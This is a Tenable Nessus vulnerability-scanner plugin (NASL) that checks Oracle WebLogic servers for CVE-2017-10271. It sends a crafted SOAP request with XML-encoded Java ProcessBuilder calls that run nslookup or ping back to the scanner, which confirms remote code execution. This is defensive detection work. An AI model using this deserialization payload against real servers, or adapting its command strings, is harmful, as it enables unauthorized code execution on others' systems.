#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(105484);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2017-10271");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/08/10");

  script_name(english:"Oracle WebLogic WSAT Remote Code Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote Oracle WebLogic server is affected by a remote code
execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Oracle WebLogic server is affected by a remote code
execution vulnerability in the WSAT endpoint due to unsafe
deserialization of XML encoded Java objects. An unauthenticated,
remote attacker can exploit this, via a crafted Java object, 
to execute arbitrary Java code in the context of the WebLogic
server.");
  # https://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html#AppendixFMW
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b680917f");
  script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch according to the October 2017 Oracle
Critical Patch Update advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:H/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2017-10271");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Oracle WebLogic wls-wsat Component Deserialization RCE');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2017/10/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2017/10/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2017/12/28");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:oracle:weblogic_server");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2017-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("weblogic_detect.nasl");
  script_require_keys("www/weblogic");
  script_require_ports("Services/www", 80, 7001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

appname = "Oracle WebLogic Server";

get_kb_item_or_exit("www/weblogic");
port = get_http_port(default:7001, embedded:FALSE);
get_kb_item_or_exit("www/weblogic/" + port + "/installed");

# establish if WSAT is enabled. If it isn't then we don't
# need to proceed any futher
res = http_send_recv3(
  method:'GET',
  item:'/wls-wsat/CoordinatorPortType',
  port:port,
  exit_on_fail:TRUE);
if (empty_or_null(res) || '404' >< res[0])
{
  audit(AUDIT_INST_VER_NOT_VULN, appname);
}

# generate a unique pattern for each execution. unixtime() is not
# granular enough since there may be many installs and this script
# could be running in parallel
pattern = hexstr(rand_str(length:8));

# create the HTTP request that will execute the DNS lookup. We'll try to execute
# via both cmd and sh since we have no real insight into the remote OS.
# Because some minimal Linux installs don't include nslookup, we'll also fallback
# on using ping if necessary... although I think that is mostly paranoia.
ns_lookup = 'nslookup weblogic-2017-10271-' + pattern + ' ' + compat::this_host();
xml_encoded_java =
'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">' +
  '<soapenv:Header>' +
    '<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">' +
      '<java>' +
        '<void class="java.lang.ProcessBuilder">' +
          '<array class="java.lang.String" length="3" >' +
            '<void index="0">' +
              '<string>cmd.exe</string>' +
            '</void>' +
            '<void index="1">' +
              '<string>/c</string>' +
            '</void>' +
            '<void index="2">' +
              '<string>' + ns_lookup + '</string>' +
            '</void>' +
          '</array>' +
          '<void method="start"/>' +
        '</void>' +
        '<void class="java.lang.ProcessBuilder">' +
          '<array class="java.lang.String" length="3" >' +
            '<void index="0">' +
              '<string>/bin/sh</string>' +
            '</void>' +
            '<void index="1">' +
              '<string>-c</string>' +
            '</void>' +
            '<void index="2">' +
              '<string>' + ns_lookup + '</string>' +
            '</void>' +
          '</array>' +
          '<void method="start"/>' +
        '</void>' +
        '<void class="java.lang.ProcessBuilder">' +
          '<array class="java.lang.String" length="3" >' +
            '<void index="0">' +
              '<string>/bin/sh</string>' +
            '</void>' +
            '<void index="1">' +
              '<string>-c</string>' +
            '</void>' +
            '<void index="2">' +
              '<string>ping -c 10 -p ' + pattern + ' ' + compat::this_host() + '</string>' +
            '</void>' +
          '</array>' +
          '<void method="start"/>' +
        '</void>' +
      '</java>' +
    '</work:WorkContext>' +
    '</soapenv:Header>' +
  '<soapenv:Body/>' +
'</soapenv:Envelope>';
request =
  'POST /wls-wsat/CoordinatorPortType HTTP/1.1\r\n' +
  'Host: ' + get_host_ip() + ':' + port + '\r\n' +
  'Content-Type: text/xml\r\n' +
  'Content-Length: ' + len(xml_encoded_java) + '\r\n' +
  '\r\n' +
  xml_encoded_java;

soc = open_sock_tcp(port);
if (!soc)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}

filter = "(ip and udp and port 53 and src host " + get_host_ip() + ") or (icmp and icmp[0] = 8 and src host " + get_host_ip() + ")";
response = send_capture(socket:soc, data:request, pcap_filter:filter);
close(soc);

if (empty_or_null(response))
{
  # looks like we didn't execute anything on the host
  audit(AUDIT_INST_VER_NOT_VULN, appname);
}

# We can directly search the DNS response
if (pattern >!< response)
{
  # maybe this is an ICMP response?
  icmp_data = tolower(hexstr(get_icmp_element(icmp:response, element:"data")));
  if (empty_or_null(icmp_data))
  {
    audit(AUDIT_INST_VER_NOT_VULN, appname);
  }

  if (pattern >!< icmp_data)
  {
    # couldn't find the pattern in the ICMP data
    audit(AUDIT_INST_VER_NOT_VULN, appname);
  } 
}

report =
  '\nNessus was able to exploit a Java deserialization vulnerability by' +
  '\nsending a crafted Java object.' +
  '\n';
security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
